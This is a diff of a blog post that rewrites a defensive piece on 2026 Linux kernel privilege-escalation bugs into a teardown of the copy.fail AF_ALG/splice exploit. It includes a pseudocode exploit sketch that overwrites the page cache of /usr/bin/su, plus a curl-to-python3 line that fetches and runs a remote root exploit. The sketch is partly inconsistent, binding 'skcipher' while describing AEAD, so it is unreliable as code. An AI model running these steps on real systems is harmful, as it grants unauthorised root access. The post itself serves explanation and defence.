@@ -1,42 +1,60 @@
 +++
-title = "The Month Linux Broke: Handling a Wave of Universal Kernel 0-Days"
+title = "copy.fail: Four Bytes of Scratch Data and You're Root"
 date = "2026-09-02"
 +++
 
-# The Month Linux Broke: Handling a Wave of Universal Kernel 0-Days
+# copy.fail: Four Bytes of Scratch Data and You're Root
 
-There used to be a rhythm to Linux kernel privilege escalation bugs. Dirty Cow dropped in 2016 and we all scrambled. Dirty Pipe came in 2022 and we scrambled again. One universal local privilege escalation every five to eight years was the pattern, and operations teams planned around it.
+A 732-byte Python script that makes you root on every Linux distro since 2017, no offsets, no KASLR defeat, no race to win on your particular kernel build. Ed at Low Level did the full teardown of the bug behind it, and even with a beautified PoC in front of me, I had to draw the scatterlists on paper. This is a memory corruption bug where nothing gets corrupted. That's why it's beautiful, and why it's hard to fix.
 
-In the spring of 2026 that pattern broke. Two landed in the same week, and more kept coming.
+## The setup: AF_ALG
 
-## The Bugs
+The whole bug lives in the kernel crypto API's user interface, `AF_ALG`. You create a socket, bind it to an algorithm name, and the kernel does the crypto for you, hardware-accelerated when available. The relevant algorithm family is AEAD, authenticated encryption with associated data, and its contract matters: data must arrive as AAD first, then ciphertext, then tag. HMAC-style authentication on top of encryption.
 
-The wave started with copy.fail, a local privilege escalation that works on every Linux distro since 2017. It exploits the kernel's AF_ALG crypto socket interface, where a splice operation lets you glue a socket you own to a file descriptor you don't. Because of a 2017 optimization that shares scatter lists between input and output, the kernel temporarily writes four bytes outside the page cache entry of the target file. You point that at `/usr/bin/su`, overwrite the page cache copy in memory while the on-disk binary stays untouched, then run `su` and get a root shell. A 732-byte Python script was the entire exploit. One version, every distro, no per-kernel offsets to patch.
+Under the hood, a socket is backed by scatterlists, linked lists of pages with offsets and lengths. Your `sendmsg` puts user pages into the input scatterlist. The kernel allocates fresh pages for the output scatterlist where results land, which you read back later. Two separate lists. Keep that in mind.
 
-Roughly two weeks later came Dirty Frag, another universal LPE built on the same splice primitive, this time landing out-of-bounds page cache writes through ESP. The researcher openly credited copy.fail as the motivation: one person found a pattern, and everyone else went looking for the pattern everywhere else in the kernel.
+## The bug
 
-Then bad_epoll arrived in July, a use-after-free triggered by linking two epoll objects and closing them both at once. The race window is six instructions wide. AddressSanitizer cannot even instrument it, the free and the conflicting write happen inside a span smaller than the checks ASan runs, which is also why Anthropic's Mythos missed it. A human found it with his eyes. That detail is worth sitting with: the best AI vulnerability researcher on the planet and a sanitizing compiler both walked past a bug that one patient human caught.
+For the in-place optimization added in 2017, the kernel saves a page allocation by pointing the *output* destination at the *input* page, the one holding your plaintext tags. Fine, it's all kernel crypto data. But for one IPsec algorithm using extended sequence numbers, computing the HMAC needs a tiny scratch pad, four bytes, and the code writes that scratch data *just past* the tag region, outside the input scatterlist's bounds.
 
-## What Actually Changed
+So the primitive as published: a four-byte write, at a controlled offset, to a page that should be input-only. And now the trick, which is where Ed's walkthrough earns its keep. You don't send the tag page as part of your `sendmsg`. You splice it in from somewhere you like better:
 
-Two shifts matter more than the individual CVEs.
+```python
+# the exploit shape (reconstructed from the writeup)
+alg = socket(AF_ALG, SOCK_SEQPACKET)
+alg.bind(("skcipher", "cbc(aes)"))        # encryption...
+alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
+req = alg.accept()                         # request socket
 
-First, vulnerability research became pattern farming. Every one of these bugs is a known kernel primitive used in a slightly wrong place. When discovery is pattern recognition, and AI makes pattern recognition cheap, finding the next instance of a pattern in a 30-million-line codebase stops being a multi-year effort. The LinkedIn post that got passed around put it well: these bugs sat dormant for years, protected only by a lack of human bandwidth. The backlog is being cleared, and we are the backlog.
+req.sendmsg(aad + ciphertext)              # AAD + data → input scatterlist
+# ← NOT the tag. instead:
+os.open("/usr/bin/su", ...)                # → page-cache pages for su
+pipe_fd = pipe()
+splice(pipe chain: su_fd → crypto_socket)  # su's page NOW in scatterlist
+# crypto engine writes its 4-byte ESN scratch
+#   → lands INSIDE THE PAGE-CACHE PAGE OF /usr/bin/su
+write4(target_fd, offset, b"AAAA")         # repeat for each 4-byte chunk
+```
 
-Second, "universal" stopped being an exception. A bug that needs per-droso offsets gets patched slowly because every vendor builds their own fix. A logic bug like copy.fail with one 732-byte script that works everywhere compresses your patch window to zero. The mitigation math defenders rely on, "not exploited in the wild yet, we have time," assumes the exploit is hard to write. It no longer is.
+`splice` glues a pipe between your file descriptor and the crypto socket, which does something remarkable: it appends *the page-cache page of `/usr/bin/su`* to the scatterlist. The four bytes of scratch the crypto engine was already writing past the tag region now land inside the page cache copy of `su`.
 
-## How I Handle It
+And `splice` takes an offset. So the "write 4 bytes anywhere" primitive arrives wrapped in a bow: offset 0, write 4, offset 4, write 4, and so on until the kernel's cached copy of `su` is your shellcode instead of the setuid binary.
 
-I ran Linux fleet response long enough to know the gap between "patch available" and "hosts rebooted" is measured in weeks, not days. Kernel reboots are the worst kind of maintenance window. So when universal LPEs drop, triage looks like this.
+## Why root
 
-Exposure first. Which hosts actually have unprivileged users or code execution paths an attacker could already reach? A universal LPE matters on a jump host, a container node, or a developer laptop. It matters much less on an appliance with no user logins. Asset inventory is the whole game here, and it has to exist before the CVE drops, not after.
+The beautiful part is how little work remains. `/usr/bin/su` on disk never changes. But the kernel serves program executions from the page cache, and the page cache now contains your shellcode. It still sees `su` as a setuid binary, so when anything executes it, the shellcode runs as UID 0. The demo is one line:
 
-Then detection before patch. You will not reboot a fleet in 48 hours. You can, however, watch for the known exploit primitives. For this wave: unexpected AF_ALG socket binds, splice syscalls between unusual file descriptor pairs, epoll object linking patterns from unprivileged processes. None of these are perfect, and none of them catch a novel variant. They buy time, and time is what patching needs.
+```bash
+curl -s https://copy.fail/exploit.py | python3 - ; su -c id
+# → uid=0(root) with no password prompt
+```
 
-And then the boring discipline. Staged rollouts, canary reboots, and a standing kernel-update runbook that has actually been rehearsed instead of sitting in a wiki. The teams that ate this wave quietly were the ones with a reboot cadence already scheduled. The teams that got hurt were the ones who discovered during triage that their kernel was three years out of support.
+The published PoC ships the shellcode gzipped, which is a size convenience for the demo, not a functional requirement.
 
-## The Honest Take
+## The fix and what it signals
 
-The kernel is not falling apart. It is being audited at a speed it was never staffed for. The bugs were always there. What changed is that finding them went from a career-defining effort to a pattern search, and that pattern search is now available to anyone.
+The mainline commit (A664B in the revert chain) removes the 2017 in-place optimization that let input and output scatterlists alias. Defensively, if AEAD is a loadable module on your distro, you can blacklist and block autoload, which is the option that works this month. If it's compiled in, you're waiting for the kernel that ships the revert.
 
-For blue teams this is actually good news with terrible timing. Every dormant universal LPE that gets found and patched is one that never burns us at 3 AM. But between here and the fully patched fleet is a window measured in months, and during that window, assume any foothold on a Linux host is an hour away from root.
+## My read
+
+Every universal LPE is a story about a contract that holds everywhere except where it matters. The AEAD contract says input pages are read-only. A 2017 optimization broke it in one narrow case (scratch writes past the tag), and everyone's threat model for that case was "it's our own crypto state, who cares." The answer turned out to be "page cache, so everyone." When Ed called this "one of the most beautiful exploits I've seen in a while," I get it. The primitive is four bytes. The architecture that makes four bytes fatal is a decade old, shipped in every distro, and reads like an engineering joke: the write the kernel never meant to be a write, pointed at the file the kernel never checks because it's cache, not memory. There's a whole genre now, copy.fail, Dirty Pipe, Dirty Cow, of "write four bytes into where the kernel keeps its copy of the truth." Detecting the exploit isn't the game. Patching cadence is, and this one had a decade of runway before anyone looked.
